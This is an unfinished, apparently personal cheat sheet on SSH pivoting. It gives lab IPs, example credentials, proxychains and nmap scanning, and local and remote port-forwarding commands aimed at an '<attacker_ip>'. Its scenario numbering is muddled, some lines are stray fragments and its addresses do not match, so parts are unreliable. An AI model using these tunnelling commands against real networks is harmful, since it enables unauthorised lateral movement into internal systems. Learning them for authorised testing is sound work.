# UNDER CONSTRUCTION

# Pivoting
Pivoting is a technique that allows attackers to use a compromised system to attack other machines in the same network, or more devastatingly, machines in another network that the compromised machine has access to. There are several techniques that can be used to pivot deeper into the network, and I’ll be describing some of them in the next few articles. I’ve found that this topic can be a bit confusing to beginners, and I hope that these articles will help clear things up. In this article, we’ll look at pivoting with SSH.  

## Links
https://blog.techorganic.com/2012/10/06/introduction-to-pivoting-part-1-ssh/  
https://laconicwolf.com/2017/07/27/ssh-nmap-and-proxychains/  
https://highon.coffee/blog/ssh-meterpreter-pivoting-techniques/  
http://www.hackingarticles.in/ssh-pivoting-using-meterpreter/  
https://www.corelan.be/index.php/2014/01/04/metasploit-meterpreter-and-nat/  
https://habr.com/ru/post/302168/  

## Usage examples:
172.50.50.100 - attacker IP  
172.50.50.1 - Proxy, Web server with vulnerable Web App  
172.60.60.100 - DMZ server, DB server, Destination IP, Target IP  
We have SSH access to Proxy with credentials:
username: john
password: jacobsjohny


### Scenario 1
First of all we need to scan target IP with nmap.
ssh root@10.11.1.251 -D 9050 -N -f
netstat -tulpn | grep 9050
def port 9050  /etc/proxychains.config

proxychains nmap -sT -A --top-ports=100 10.1.1.224,235,236,248,254

### Scenario 1
Now we need access to 172.60.60.100 ports 139,22,80,443.
We have no direct access to the machine, but we have SSH access to 172.50.50.1 which is proxy server for 172.60.60.100.
So to scan 172.60.60.100 or access some identified ports we should use pivoting technique.

Let's assume that proxy server has two interfaces:  
ens33 - 172.50.50.1 - external network  
ens34 - 172.60.60.1 - DMZ network  

ssh -R 8080:<attacker_ip>:80 john@172.50.50.1

### Scenario 3
Let's say we need access to Proxy server's internal service which is running only on localhost, let's say MySQL ruunin on 127.0.0.1:3306

 -p 22000

from <attacker_ip> connect to 10.11.1.252
create port 8080 on 10.11.1.252
which will be linked with <attacker_ip>:80
ssh -R 8080:<attacker_ip>:80 j0hn@10.11.1.252 -p 22000

from <attacker_ip> connect to 10.11.1.252
create port 4450 on <attacker_ip>
which will be linked with 10.2.2.15:445
ssh -L 4450:10.2.2.15:445 j0hn@10.11.1.252 -p 22000

ssh -L 9999:10.1.1.224:3389 root@10.11.1.251

simple
ssh -L 2200:10.1.1.236:22 plink@<attacker_ip>
Q6C1GsAuF1ZrN51dU
ssh -R 2200:10.1.1.236:22 plink@<attacker_ip>
ssh -R 6080:10.1.1.236:80 -R 6022:10.1.1.236:22 -R 6111:10.1.1.236:111 -R 6053:10.1.1.236:53 -R 6025:10.1.1.236:25 plink@<attacker_ip>
Q6C1GsAuF1ZrN51dU
